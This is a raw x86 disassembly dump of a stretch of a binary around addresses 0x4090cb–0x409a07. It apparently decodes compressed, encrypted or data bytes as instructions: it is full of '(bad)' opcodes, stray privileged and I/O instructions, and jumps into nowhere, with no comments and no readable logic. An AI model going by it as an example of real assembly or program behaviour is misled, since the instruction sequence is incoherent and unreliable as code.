  4090cb:	mov    ds:0xb5f762e2,al
  4090d0:	loope  0x40912c
  4090d2:	idiv   edi
  4090d4:	loop   0x4090ba
  4090d6:	push   cs
  4090d7:	call   0x37c70e
  4090dc:	ret    0xe024
  4090df:	not    edx
  4090e1:	(bad)  
  4090e2:	div    DWORD PTR [ebp-0x63]
  4090e5:	js     0x409070
  4090e7:	mov    ds:0xb5f762e2,al
  4090ec:	leave  
  4090ed:	pop    edx
  4090ee:	idiv   edi
  4090f0:	xor    ah,ah
  4090f2:	push   cs
  4090f3:	call   0x37c39e
  4090f8:	mov    WORD PTR [edx],es
  4090fa:	jg     0x4090dc
  4090fc:	jnp    0x409109
  4090fe:	cmp    edi,edi
	...
  409114:	loope  0x4090bb
  409116:	adc    ah,BYTE PTR [ebp+0x2e]
  409119:	sbb    edi,DWORD PTR [ecx]
  40911b:	jmp    DWORD PTR [ecx]
  40911d:	add    dh,BYTE PTR [ecx]
  40911f:	call   DWORD PTR [ebx+0x2b]
  409122:	mov    edi,0x6cdb3407
  409127:	inc    DWORD PTR [ebx+0x3b]
  40912a:	jg     0x409110
  40912c:	inc    ebx
  40912d:	inc    ebx
  40912e:	cmp    eax,ebp
  409130:	jne    0x409142
  409132:	cmp    edi,edi
  409134:	sub    ebx,DWORD PTR [ecx]
  409136:	sub    al,0xf7
  409138:	and    ebx,DWORD PTR [ebx+0x14]
  40913b:	cs icebp 
  40913d:	bound  edi,QWORD PTR [ecx]
  40913f:	(bad)  
  409140:	fstp   DWORD PTR [ecx+0x31]
  409143:	dec    DWORD PTR [ebx]
  409145:	xchg   ch,ch
  409147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409148:	add    edi,DWORD PTR [ebx+0x39]
  40914b:	mov    ch,0xe4
  40914d:	jp     0x409188
  40914f:	jmp    esp
  409151:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409152:	ins    DWORD PTR es:[edi],dx
  409153:	(bad)  
  409154:	jmp    0x4090e8
  409156:	jg     0x409134
  409158:	fistp  DWORD PTR [edx+0x4889e837]
  40915e:	cmp    edi,edi
  409160:	shl    DWORD PTR [eax+0x3c],cl
  409163:	test   ebx,0x907537b2
  409169:	mov    edx,0x80a407bd
  40916e:	cmp    bh,bh
  409170:	mov    bl,0xca
  409172:	jge    0x409164
  409174:	mov    ds:0xe837d2,eax
	...
  409189:	add    BYTE PTR [eax],al
  40918b:	add    BYTE PTR [ebp-0x6400c7ef],bl
  409191:	push   0xeb3de924
  409196:	aaa    
  409197:	dec    DWORD PTR [ebx+0x74301494]
  40919d:	mov    DWORD PTR [eax+0x3],esi
  4091a0:	mov    ebp,cs
  4091a2:	mov    ds:0x6a4073ff,al
  4091a7:	pop    ds
  4091a8:	(bad)  
  4091aa:	mov    WORD PTR [ebp+0x30de2d63],ds
  4091b0:	loope  0x40913e
  4091b2:	mov    DWORD PTR [esi+ebp*1],eax
  4091b5:	fwait
  4091b6:	gs jp  0x40918a
  4091b9:	cwde   
  4091ba:	fadd   DWORD PTR [edi+eiz*8]
  4091bd:	push   ebp
  4091be:	loope  0x4091f0
  4091c0:	add    edi,0x9a33c2a8
  4091c6:	(bad)  
  4091c8:	xor    esp,DWORD PTR [edx+0x2c23304b]
  4091ce:	loop   0x40919c
  4091d0:	int3   
  4091d1:	xchg   esp,eax
  4091d2:	leave  
  4091d3:	add    eax,0x3061948c
  4091d8:	or     DWORD PTR [ecx+ebx*1+0x159b0127],0x1d988130
  4091e3:	mov    dh,0x8b
  4091e5:	lods   al,BYTE PTR ds:[esi]
  4091e6:	(bad)  
  4091e7:	gs jmp 0x409184
  4091ea:	aaa    
  4091eb:	inc    ebp
  4091ec:	mov    BYTE PTR [esp+ebx*4+0x7c],dl
	...
  409203:	add    al,ch
  409205:	adc    al,0x25
  409207:	pop    ds
  409208:	fistp  DWORD PTR [edx-0x67ae821b]
  40920e:	xor    BYTE PTR [edi],ch
  409210:	cmp    DWORD PTR [esi+edx*8-0x71537847],eax
  409217:	xchg   esp,eax
  409218:	mov    WORD PTR [edx+ebp*8+0x7e119b43],ss
  40921f:	add    al,0x8c
  409221:	xchg   esp,eax
  409222:	scas   al,BYTE PTR es:[edi]
  409223:	leave  
  409224:	mov    ds:0x8fe90893,eax
  409229:	xchg   esp,eax
  40922a:	iret   
  40922b:	and    al,0xc4
  40922d:	cdq    
  40922e:	push   cs
  40922f:	jmp    0x1348c0c3
  409234:	nop
  409235:	or     BYTE PTR cs:[ebx],al
  409238:	mov    BYTE PTR [edi],al
  40923a:	dec    ebp
  40923b:	xchg   ebp,eax
  40923c:	inc    eax
  40923d:	or     DWORD PTR [ebp-0x9666483],ecx
  409243:	sbb    DWORD PTR [ebx+0x1576f01f],ebp
  409249:	sahf   
  40924a:	fisttp WORD PTR [edi+0x20]
  40924d:	xchg   ebp,eax
  40924e:	or     dl,dh
  409250:	iret   
  409251:	and    BYTE PTR [edx],cl
  409253:	push   edx
  409254:	push   ebp
  409255:	or     DWORD PTR [ebp-0x96684bb],ecx
  40925b:	mov    ecx,0x3efc100c
  409260:	jae    0x4091fb
  409262:	push   edi
  409263:	ds aad 0x89
  409266:	idiv   DWORD PTR [eax+eax*1+0x0]
	...
  409279:	add    BYTE PTR [eax],al
  40927b:	add    BYTE PTR [ebx],dl
  40927d:	mov    dl,0x48
  40927f:	xchg   BYTE PTR [ebx-0x47937f67],bh
  409285:	mov    eax,ds:0xd9f71ef6
  40928a:	jnp    0x409257
  40928c:	push   cs
  40928d:	fsub   st,st(3)
  40928f:	push   ss
  409290:	mov    ebx,0x907d0799
  409295:	sub    al,0x8
  409297:	jmp    0x3d376d16
  40929c:	lods   al,BYTE PTR ds:[esi]
  40929d:	mov    eax,ds:0xdf7aeef6
  4092a2:	neg    esi
  4092a4:	jb     0x40923f
  4092a6:	not    BYTE PTR [eax+edi*4-0x4f]
  4092aa:	mov    esp,0xf69962a0
  4092af:	xchg   esp,eax
  4092b0:	pop    edi
  4092b1:	mov    eax,ds:0x7dca00f6
  4092b6:	cli    
  4092b7:	mov    ds:0x45f76ada,eax
  4092bc:	fnstsw WORD PTR [esi-0x78]
  4092bf:	inc    eax
  4092c1:	fs loopne 0x4092d5
  4092c4:	add    eax,0x27c90896
  4092c9:	cdq    
  4092ca:	not    BYTE PTR [esi+ebp*8+0x79]
  4092ce:	mov    eax,esp
  4092d0:	sbb    ebx,edi
  4092d2:	imul   BYTE PTR [ecx+0x6d]
  4092d5:	push   0x7d
  4092d7:	or     ch,bh
  4092d9:	xchg   ecx,eax
  4092da:	test   eax,0x4d18daff
  4092df:	cld    
	...
  4092f4:	lea    edi,[eax+0x6a354151]
  4092fa:	cmp    eax,0xf6cffdd3
  4092ff:	(bad)  
  409300:	push   eax
  409301:	popf   
  409302:	out    dx,al
  409303:	and    eax,0x68f76ada
  409308:	jge    0x4092d7
  40930a:	inc    edi
  40930b:	add    BYTE PTR ds:0xa5000893,bh
  409311:	push   0x7d
  409313:	or     BYTE PTR [ebp-0x7a],cl
  409316:	idiv   edi
  409318:	stos   BYTE PTR es:[edi],al
  409319:	std    
  40931a:	inc    edi
  40931b:	pop    ebx
  40931c:	and    al,0x95
  40931e:	div    DWORD PTR ds:0x47ddb6
  409324:	call   0xf769:0xf5e80edc
  40932b:	(bad)  
  40932c:	std    
  40932d:	iret   
  40932e:	push   ecx
  40932f:	inc    ecx
  409330:	in     eax,0xfc
  409332:	or     BYTE PTR [eax],al
  409334:	mov    ch,0x14
  409336:	div    DWORD PTR [ebp-0x43]
  409339:	jl     0x409321
  40933b:	(bad)  
  40933c:	fisub  DWORD PTR [esi-0x9]
  40933f:	jne    0x4092cd
  409341:	mov    edi,0xd3947524
  409346:	mov    al,ds:0xc232d1a3
  40934c:	nop
  40934d:	stos   DWORD PTR es:[edi],eax
  40934e:	fisttp QWORD PTR [edx+0xbbee1a0]
  409354:	je     0x409344
  409356:	ins    BYTE PTR es:[edi],dx
  409357:	inc    DWORD PTR [eax]
	...
  409369:	add    BYTE PTR [eax],al
  40936b:	add    BYTE PTR [ebx-0x358bb55d],al
  409371:	test   DWORD PTR [edx-0x255232a6],esp
  409377:	out    0xd8,eax
  409379:	dec    esi
  40937a:	and    eax,0xdc7dbcff
  40937f:	mov    WORD PTR [di-0x41ed],gs
  409384:	in     al,0x89
  409386:	rol    DWORD PTR [eax-0x74],0x7d
  40938a:	and    eax,0xff459475
  40938f:	retf   
  409390:	cmp    esi,DWORD PTR [edi]
  409392:	les    esp,FWORD PTR [edi-0x73]
  409395:	lods   eax,DWORD PTR ds:[esi]
  409396:	adc    edi,DWORD PTR [esi+0x40bfd4b4]
  40939c:	mov    ebp,?
  40939e:	and    esi,DWORD PTR [ebp-0x7c]
  4093a1:	inc    ebp
  4093a2:	jmp    0x40936f
  4093a4:	adc    ebx,DWORD PTR [edi-0x3c]
  4093a7:	mov    gs,WORD PTR [di-0x41ed]
  4093ac:	je     0x4093ad
  4093ae:	mov    edi,0x23dd8c40
  4093b3:	jne    0x409339
  4093b5:	xchg   ebp,eax
  4093b6:	test   ebx,0x161486eb
  4093bc:	das    
  4093bd:	(bad)  
  4093be:	and    eax,0xaa5cec9
  4093c3:	push   ebp
  4093c4:	pop    es
  4093c5:	xchg   edx,eax
  4093c6:	mov    esp,eax
  4093c8:	enter  0xb13,0x6a
  4093cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093cd:	xchg   esp,eax
  4093ce:	out    dx,al
  4093cf:	mov    dh,0x0
	...
  4093e1:	add    BYTE PTR [eax],al
  4093e3:	add    BYTE PTR [ebx-0x4c9bd754],dl
  4093e9:	xchg   edi,eax
  4093ea:	addr16 (bad) 
  4093ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093ed:	sub    bh,bl
  4093ef:	sub    al,0x19
  4093f1:	mov    ecx,ds
  4093f3:	sbb    DWORD PTR [ebx+0x6e99b597],0xffffff97
  4093fa:	xor    edi,esp
  4093fc:	jae    0x40941c
  4093fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093ff:	sub    al,0x83
  409401:	sub    cl,BYTE PTR ds:0x998d012d
  409407:	lahf   
  409408:	jb     0x4093a1
  40940a:	popf   
  40940b:	sub    al,0xe1
  40940d:	cwde   
  40940e:	test   DWORD PTR [esi+0x6412ac8b],esi
  409414:	pop    ebx
  409415:	xchg   edi,eax
  409416:	mov    bh,0x41
  409418:	mov    BYTE PTR [esp+edx*1-0x52ecc787],dl
  40941f:	das    
  409420:	inc    ebx
  409421:	and    ebp,edi
  409423:	sbb    edx,DWORD PTR [esi-0x78d3aa11]
  409429:	aam    0xed
  40942b:	xchg   edi,ebp
  40942d:	xchg   ebx,eax
  40942e:	loope  0x409433
  409430:	adc    eax,0x99804d51
  409435:	test   cl,ah
  409437:	mov    bh,0x81
  409439:	xchg   edi,eax
  40943a:	mov    bl,0x13
  40943c:	or     esp,DWORD PTR [ecx]
  40943e:	and    eax,0x2dee251b
  409443:	sub    al,0x5
  409445:	push   ecx
  409446:	adc    eax,0x9b
	...
  40945b:	add    BYTE PTR [eax],bl
  40945d:	cmp    esp,DWORD PTR [eax+0x520eb03]
  409463:	sbb    ebx,DWORD PTR [ecx+0x3c2c0dee]
  409469:	sub    al,0xe1
  40946b:	add    esp,ebx
  40946d:	aad    0x7
  40946f:	cdq    
  409470:	js     0x409493
  409472:	add    BYTE PTR [ecx],al
  409474:	sbb    ecx,esp
  409476:	mul    dh
  409478:	cwde   
  409479:	adc    ch,BYTE PTR [edx-0x34d39822]
  40947f:	xor    dl,cl
  409481:	xchg   esi,eax
  409482:	cmc    
  409483:	push   esp
  409484:	je     0x409432
  409486:	sbb    ecx,DWORD PTR [edi+0x51579767]
  40948c:	mov    DWORD PTR [edi+eiz*8+0x7c976077],edx
  409493:	loope  0x40943c
  409495:	and    eax,eax
  409497:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409498:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409499:	lods   al,BYTE PTR ds:[esi]
  40949a:	push   0x5f95a74b
  40949f:	inc    eax
  4094a0:	pop    ebx
  4094a1:	push   ebp
  4094a2:	or     BYTE PTR [esi+0x7adf9a1d],cl
  4094a8:	in     eax,dx
  4094a9:	xchg   ebp,eax
  4094aa:	neg    BYTE PTR [ecx]
  4094ac:	lock xchg ebp,eax
  4094ae:	test   BYTE PTR [esi-0xb08bb4a],0x47
  4094b5:	scas   al,BYTE PTR es:[edi]
  4094b6:	pop    ecx
  4094b7:	xor    DWORD PTR [edi-0x6b],esp
  4094ba:	fild   QWORD PTR [ecx-0x3e096a57]
	...
  4094d4:	fnstcw WORD PTR [ecx]
  4094d6:	dec    ecx
  4094d7:	jmp    0x5234b452
  4094dc:	ret    0xf6ef
  4094df:	cmp    BYTE PTR ds:[esi],ch
  4094e2:	or     ecx,ebp
  4094e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094e5:	(bad)  
  4094e6:	push   edi
  4094e7:	cs cmp eax,0xb7d8e08e
  4094ed:	xchg   ebp,eax
  4094ee:	not    BYTE PTR [ecx]
  4094f0:	xchg   edx,esi
  4094f2:	not    BYTE PTR [esi]
  4094f4:	mov    bh,0x1f
  4094f6:	hlt    
  4094f7:	add    DWORD PTR [edi-0xe],edi
  4094fa:	test   BYTE PTR [eax],0x92
  4094fd:	push   edi
  4094fe:	retf   0xe50c
  409501:	les    eax,FWORD PTR [ecx-0xbabc914]
  409507:	push   0xffffffb5
  409509:	not    DWORD PTR [eax]
  40950b:	call   FWORD PTR [eax-0x68]
  40950e:	out    dx,al
  40950f:	cmp    DWORD PTR [edx],esi
  409511:	push   0xfffffff7
  409513:	mov    DWORD PTR [eax+0x6c],edi
  409516:	bound  eax,QWORD PTR [eax]
  409518:	dec    edi
  409519:	xchg   bh,dh
  40951b:	jne    0x4094ba
  40951d:	jns    0x409549
  40951f:	call   edx
  409521:	push   0x62
  409523:	add    bh,cl
  409525:	lods   eax,DWORD PTR ds:[esi]
  409526:	cmc    
  409527:	jne    0x409596
  409529:	jns    0x409549
  40952b:	push   DWORD PTR [edx]
  40952d:	push   0x62
  40952f:	add    BYTE PTR [edi+0x6d75f78c],bl
  409535:	jns    0x409539
  409537:	inc    DWORD PTR [eax]
	...
  409549:	add    BYTE PTR [eax],al
  40954b:	add    BYTE PTR [edx],dl
  40954d:	push   0x60
  40954f:	imul   DWORD PTR [esi+0x6f69f6cf]
  409555:	push   0x7d
  409557:	or     BYTE PTR ds:0xb2fff666,cl
  40955d:	stc    
  40955e:	std    
  40955f:	pop    ebx
  409560:	in     al,0x90
  409562:	bound  esp,QWORD PTR [ebx]
  409564:	shl    ah,cl
  409566:	push   cs
  409567:	call   0x38013d
  40956c:	dec    ebp
  40956d:	bound  edx,QWORD PTR [ebx+0x41]
  409570:	and    eax,0xd8ff12f7
  409575:	cwde   
  409576:	out    dx,al
  409577:	ffree  st(3)
  409579:	push   0xfffffff7
  40957b:	(bad)  
  40957c:	cmp    BYTE PTR [ebp-0x9],ch
  40957f:	jne    0x40957e
  409581:	js     0x4095ab
  409583:	lahf   
  409584:	xchg   edx,eax
  409585:	push   0xffffffc1
  409587:	ret    0xa78c
  40958a:	or     dl,BYTE PTR [ebp+0x17]
  40958d:	xchg   edi,eax
  40958e:	mov    al,ah
  409590:	in     al,0x95
  409592:	and    bh,bh
  409594:	add    eax,esi
  409596:	cs push eax
  409598:	retf   
  409599:	pop    ss
  40959a:	sbb    edi,edi
  40959c:	cmp    DWORD PTR [edi-0x54f647ee],esi
  4095a2:	or     cl,BYTE PTR [ebx]
  4095a4:	int3   
  4095a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095a6:	jne    0x4095ef
  4095a8:	lea    ebp,[ebx-0x3cb638f6]
  4095ae:	or     eax,DWORD PTR [eax]
	...
  4095c4:	mov    WORD PTR [ebx-0x2a67bab9],gs
  4095ca:	or     BYTE PTR [eax],al
  4095cc:	mov    edi,ss
  4095ce:	or     al,0x6a
  4095d0:	mov    edi,ss
  4095d2:	or     al,0x6a
  4095d4:	mov    WORD PTR [eax],cs
  4095d6:	mov    dh,0xf3
  4095d8:	fadd   QWORD PTR [eax]
  4095da:	jbe    0x4095d0
  4095dc:	arpl   WORD PTR [ebx],bp
  4095de:	and    BYTE PTR [eax+0x63],dl
  4095e1:	test   eax,0x19e1ff24
  4095e6:	adc    eax,0xa7e018a
  4095eb:	or     ecx,DWORD PTR [edx+edx*4-0x9]
  4095ef:	call   0x4b128a
  4095f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095f5:	sub    dh,BYTE PTR [ebp-0x5a0d73c0]
  4095fb:	sysenter 
  4095fd:	(bad)  
  4095fe:	push   0x754e23ff
  409603:	ror    BYTE PTR [ecx],1
  409605:	add    DWORD PTR [ecx],edi
  409607:	not    DWORD PTR [ebx]
  409609:	rcr    esp,cl
  40960b:	push   ecx
  40960c:	hlt    
  40960d:	mov    dh,0x68
  40960f:	inc    DWORD PTR [ebx]
  409611:	cmc    
  409612:	jne    0x409604
  409614:	add    edx,DWORD PTR [ebp-0x4a1bd6d2]
  40961a:	inc    eax
  40961b:	sub    ebx,ebp
  40961d:	(bad)  
  40961e:	fistp  WORD PTR [ebx+0x3a0f039]
  409624:	fisttp DWORD PTR [ecx-0x10]
  409627:	xor    BYTE PTR [eax],al
	...
  409639:	add    BYTE PTR [eax],al
  40963b:	add    bl,dl
  40963d:	xchg   ebx,eax
  40963e:	imul   DWORD PTR [esi+0x5fc47c97]
  409644:	ret    
  409645:	xchg   ebx,eax
  409646:	imul   edi,DWORD PTR [edi-0x58],0x2628ef8b
  40964d:	xchg   esp,eax
  40964e:	push   edi
  40964f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409650:	inc    edi
  409651:	aad    0xdf
  409653:	sub    cl,bl
  409655:	test   bh,bl
  409657:	sub    BYTE PTR [ebx-0x5407ca6d],bl
  40965d:	popf   
  40965e:	mov    ebp,DWORD PTR [eax]
  409660:	mov    ebx,DWORD PTR ds:0x937b1b65
  409666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409667:	test   BYTE PTR [ecx],bh
  409669:	adc    BYTE PTR [edi+0x1b947328],0xf4
  409670:	repz xchg esp,eax
  409672:	fistp  WORD PTR [eax]
  409674:	and    bh,ah
  409676:	in     eax,0xc7
  409678:	int3   
  409679:	xchg   esp,eax
  40967a:	mov    gs,WORD PTR [esi+0x60]
  40967d:	mov    esi,DWORD PTR [edi+0x28]
  409680:	dec    ebx
  409681:	or     eax,ebp
  409683:	sbb    eax,DWORD PTR [eax]
  409685:	pop    ebp
  409686:	sub    BYTE PTR [si-0x206b],ah
  40968b:	sbb    dl,dh
  40968d:	sti    
  40968e:	pop    ss
  40968f:	enter  0x94cc,0x5e
  409693:	outs   dx,BYTE PTR ds:[esi]
  409694:	xor    BYTE PTR [ebx+0x91b2847],cl
  40969a:	clc    
  40969b:	sbb    ebp,eax
  40969d:	pop    esp
  40969e:	aaa    
  40969f:	sub    BYTE PTR [eax],al
	...
  4096b1:	add    BYTE PTR [eax],al
  4096b3:	add    BYTE PTR [edi],cl
  4096b5:	push   ecx
  4096b6:	or     DWORD PTR [ecx-0x44],eax
  4096b9:	xchg   ebx,eax
  4096ba:	imul   cl
  4096bc:	sub    eax,ebx
  4096be:	pusha  
  4096bf:	jmp    0x91f81a53
  4096c4:	xchg   ebp,eax
  4096c5:	lock inc edi
  4096c7:	jmp    0x1721e080
  4096cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096cd:	xchg   ebx,eax
  4096ce:	idiv   BYTE PTR [edi+edx*8+0x7a]
  4096d2:	mov    dh,BYTE PTR [eax]
  4096d4:	je     0x409669
  4096d6:	popa   
  4096d7:	call   0x81f81a6b
  4096dc:	xlat   BYTE PTR ds:[ebx]
  4096dd:	out    dx,al
  4096de:	inc    edi
  4096df:	jmp    0xd721e04e
  4096e4:	jae    0x409679
  4096e6:	neg    BYTE PTR [eax+eiz*4+0x7a]
  4096ea:	bound  esp,QWORD PTR [eax+0x7cf69373]
  4096f0:	je     0x40967d
  4096f2:	idiv   BYTE PTR [esi-0x4956fd58]
  4096f8:	stos   DWORD PTR es:[edi],eax
  4096f9:	xchg   ecx,eax
  4096fa:	mov    esp,0xf691abc1
  4096ff:	xchg   ecx,eax
  409700:	das    
  409701:	xor    dh,dh
  409703:	sahf   
  409704:	mov    bl,0x47
  409706:	stc    
  409707:	sahf   
  409708:	stos   DWORD PTR es:[edi],eax
  409709:	xchg   ecx,eax
  40970a:	not    BYTE PTR [esp+edx*2]
  40970d:	xchg   ebx,eax
  40970e:	jl     0x409701
  409710:	ja     0x40975a
  409712:	idiv   DWORD PTR [esi+0x73]
  409715:	xchg   ecx,eax
  409716:	mov    esp,0x79
	...
  40972b:	add    BYTE PTR [ebx-0x6f],dh
  40972e:	test   BYTE PTR [ecx+0x66f631fb],0x6b
  409735:	xlat   BYTE PTR ds:[ebx]
  409736:	lock push eax
  409738:	push   0x6b56f692
  40973d:	pop    es
  40973e:	cmc    
  40973f:	inc    ecx
  409740:	out    dx,eax
  409741:	sbb    eax,0xd1250009
  409746:	retf   0xf50c
  409749:	fs sub esp,0xffffffba
  40974d:	inc    ebx
  40974e:	add    ch,al
  409750:	gs hlt 
  409752:	cmc    
  409753:	(bad)  
  409754:	(bad)  
  409755:	aad    0x7c
  409757:	cmp    ebp,edi
  409759:	adc    DWORD PTR [edx+0x41],0xfffffff5
  40975d:	gs out dx,al
  40975f:	or     al,0x51
  409761:	mov    ecx,0x2df550f5
  409766:	idiv   bh
  409768:	call   0xf659:0x191e60fa
  40976f:	dec    edi
  409770:	stos   BYTE PTR es:[edi],al
  409771:	inc    esp
  409772:	push   cs
  409773:	call   0x36654b
  409778:	dec    ebp
  409779:	xor    BYTE PTR [ecx],cl
  40977b:	add    dl,cl
  40977d:	mul    DWORD PTR [eax+0x28]
  409780:	imul   edx,DWORD PTR [edi-0xa],0xe44ca4f
  409787:	call   0x3664e3
  40978c:	dec    ebp
  40978d:	scas   al,BYTE PTR es:[edi]
  40978e:	xchg   ebp,eax
  40978f:	inc    DWORD PTR [eax]
	...
  4097a1:	add    BYTE PTR [eax],al
  4097a3:	add    BYTE PTR [edx],ch
  4097a5:	ror    dl,1
  4097a7:	or     BYTE PTR [ebp+0x64],ah
  4097aa:	sub    esp,0xfffffff6
  4097ad:	shl    esp,1
  4097af:	push   esi
  4097b0:	mov    ds:0x5e69f62e,al
  4097b5:	mov    edx,0x8dfd087b
  4097ba:	xchg   ebp,eax
  4097bb:	dec    edx
  4097bd:	adc    BYTE PTR [esp+edi*8-0x52],cl
  4097c1:	test   BYTE PTR [edi+0x48],bl
  4097c4:	fs cwde 
  4097c6:	cmp    DWORD PTR ds:0x494d4e,0xef67ab5
  4097d0:	mov    edi,?
  4097d2:	bound  eax,QWORD PTR [eax]
  4097d4:	mov    WORD PTR [ebx-0x6e],?
  4097d7:	adc    dh,BYTE PTR [eax-0xba9f5c4]
  4097dd:	mov    BYTE PTR [esi+0x0],bh
  4097e0:	mov    WORD PTR [esi+0x4a],?
  4097e3:	je     0x40982f
  4097e5:	cmp    ecx,DWORD PTR [edx+0x768a8c38]
  4097eb:	xchg   DWORD PTR [ebx+edi*2-0x718baff6],ecx
  4097f2:	into   
  4097f3:	inc    eax
  4097f4:	mov    WORD PTR [ebx+0x7b8c8990],ss
  4097fa:	rol    BYTE PTR [edx],0xce
  4097fd:	sub    dl,BYTE PTR [edx]
  4097ff:	pusha  
  409800:	cmc    
  409801:	mov    DWORD PTR [eax+edx*2],ebp
  409804:	pop    esp
  409805:	adc    ecx,DWORD PTR [edx]
	...
  40981b:	add    BYTE PTR [ebx+0x481d9538],ah
  409821:	mov    esp,0xefa3500c
  409826:	hlt    
  409827:	out    0x27,eax
  409829:	xor    ebp,DWORD PTR [edi+edi*8]
  40982c:	xor    al,0xe3
  40982e:	or     DWORD PTR [eax],eax
  409830:	jnp    0x409842
  409832:	xchg   ebp,eax
  409833:	daa    
  409834:	loopne 0x4097f2
  409836:	or     al,0x50
  409838:	jnp    0x409803
  40983a:	hlt    
  40983b:	out    0xdb,eax
  40983d:	inc    ebp
  40983e:	sub    al,0xff
  409840:	je     0x4097e0
  409842:	mov    edi,edi
  409844:	arpl   WORD PTR [ebx],dx
  409846:	enter  0x8767,0xc1
  40984a:	leave  
  40984b:	(bad)  
  40984c:	mov    edx,0x8c8b3425
  409851:	jge    0x409844
  409853:	mov    edi,0xe7c451b8
  409858:	xchg   edi,eax
  409859:	aam    0x2b
  40985b:	(bad)  
  40985c:	fcom   QWORD PTR [edi+ebp*4+0x47902b9b]
  409863:	data16 mov ah,0xae
  409866:	mov    ebx,0x46e01bc2
  40986b:	scas   eax,DWORD PTR es:[edi]
  40986c:	mov    edi,DWORD PTR [esi+eax*1+0x3c]
  409870:	or     edx,DWORD PTR [eax-0x6b736458]
  409876:	dec    esi
  409877:	fs mov sp,0xc283
  40987c:	repz fild QWORD PTR [esi]
  40987f:	scas   eax,DWORD PTR es:[edi]
	...
  409894:	xchg   ebx,eax
  409895:	jl     0x409889
  409897:	cmp    esp,ebx
  409899:	(bad)
  40989d:	pop    DWORD PTR [edi]
  40989f:	sbb    DWORD PTR [ebp-0x3419a02a],ecx
  4098a5:	or     BYTE PTR [edx],cl
  4098a7:	mov    esi,0x6b1fc3c7
  4098ac:	mov    ebx,0xbe24e78f
  4098b1:	ds sub ch,bh
  4098b4:	call   0x4a8f:0xa3252d19
  4098bb:	or     bl,BYTE PTR [ebx-0x30e417f7]
  4098c1:	mov    cs,edi
  4098c3:	and    al,0xf6
  4098c5:	mov    bl,0xb6
  4098c7:	scas   al,BYTE PTR es:[edi]
  4098c8:	mov    edi,DWORD PTR [ecx+edi*2+0x25]
  4098cc:	jnp    0x40985d
  4098ce:	dec    edx
  4098cf:	or     BYTE PTR [ebx+0x9],dh
  4098d2:	clc    
  4098d3:	sbb    edi,DWORD PTR [ebx]
  4098d5:	mov    ss,WORD PTR [edi+0x3bd8f424]
  4098db:	ret    
  4098dc:	pop    ebx
  4098dd:	mov    ds,ebp
  4098df:	push   eax
  4098e0:	(bad)  
  4098e1:	aad    0xdf
  4098e3:	and    al,0xc1
  4098e5:	pushf  
  4098e6:	xchg   edi,eax
  4098e7:	repnz inc eax
  4098e9:	(bad)
  4098ed:	rcl    DWORD PTR [eax+ebp*1-0x78],cl
  4098f1:	cld    
  4098f2:	or     ch,cl
  4098f4:	(bad)  
  4098f5:	adc    al,0xf6
  4098f7:	aam    0x0
	...
  409909:	add    BYTE PTR [eax],al
  40990b:	add    BYTE PTR [edi],ah
  40990d:	ja     0x409925
  40990f:	push   esp
  409910:	jo     0x4098a1
  409912:	not    ah
  409914:	imul   ecx,DWORD PTR [edi-0x3b580e84],0xffffff94
  40991b:	ds test al,0xef
  40991e:	push   esi
  40991f:	and    BYTE PTR [ebp-0x68],cl
  409922:	or     BYTE PTR [esp+esi*2+0x3f2d8880],dl
  409929:	xchg   esi,esi
  40992b:	push   ds
  40992c:	pop    edx
  40992d:	fxtract 
  40992f:	mov    ecx,0xe1909b0
  409934:	and    bl,BYTE PTR [ebx-0x6bbad020]
  40993a:	or     dl,dh
  40993c:	dec    edi
  40993d:	lahf   
  40993e:	mov    ebp,DWORD PTR [ebx+0x2608948d]
  409944:	xacquire xchg BYTE PTR [ecx],cl
  409947:	jmp    0x250e2ddb
  40994c:	test   BYTE PTR [edi-0x57016f2],cl
  409952:	or     BYTE PTR [ebx-0x78],al
  409955:	cli    
  409956:	or     BYTE PTR [ebx-0x70],dl
  409959:	pop    ds
  40995a:	dec    esp
  40995b:	mov    ch,0x38
  40995d:	and    DWORD PTR [ebp+edi*4+0x19f68d97],ecx
  409964:	scas   eax,DWORD PTR es:[edi]
  409965:	pop    es
  409966:	icebp  
  409967:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409968:	add    eax,0x1281e18a
  40996d:	xchg   ebp,eax
  40996e:	or     dl,ah
	...
  409984:	iret   
  409985:	or     BYTE PTR [eax+eax*4],cl
  409988:	test   DWORD PTR [edx+0x3a350008],edx
  40998e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40998f:	dec    eax
  409990:	je     0x40992a
  409992:	cmc    
  409993:	jne    0x4099ea
  409995:	mov    edx,0xb1a2a1df
  40999a:	pop    eax
  40999b:	mov    esp,DWORD PTR [ebp+0x23]
  40999e:	mov    esp,?
  4099a0:	mov    edx,0xd750f5b1
  4099a5:	mov    ecx,0xb1c2a1cf
  4099aa:	jg     0x409931
  4099ac:	lds    ebp,FWORD PTR [ecx-0x7ea2000b]
  4099b2:	xchg   esp,eax
  4099b3:	inc    edx
  4099b5:	mul    BYTE PTR ds:[edi-0x31]
  4099b9:	dec    ebp
  4099ba:	dec    ecx
  4099bb:	add    BYTE PTR [edx-0x7d080715],dh
  4099c1:	mov    cl,0xf5
  4099c3:	jne    0x4099b6
  4099c5:	mov    ecx,0xb182a13a
  4099ca:	jg     0x409951
  4099cc:	cdq    
  4099cd:	test   eax,0x921ffff5
  4099d2:	pusha  
  4099d3:	jae    0x4099f6
  4099d5:	pop    ecx
  4099d6:	idiv   dh
  4099d8:	js     0x409982
  4099da:	std    
  4099db:	push   DWORD PTR [edx-0x42f3844e]
  4099e1:	mov    ch,BYTE PTR [ecx-0x73df3d01]
  4099e7:	in     al,dx
	...
  4099fc:	mov    edx,0x756af5b2
  409a01:	cmp    DWORD PTR [edx+0x5c],esi
  409a04:	mov    ah,0x98
  409a06:	cmc    
  409a07:	mov    ch,0x35
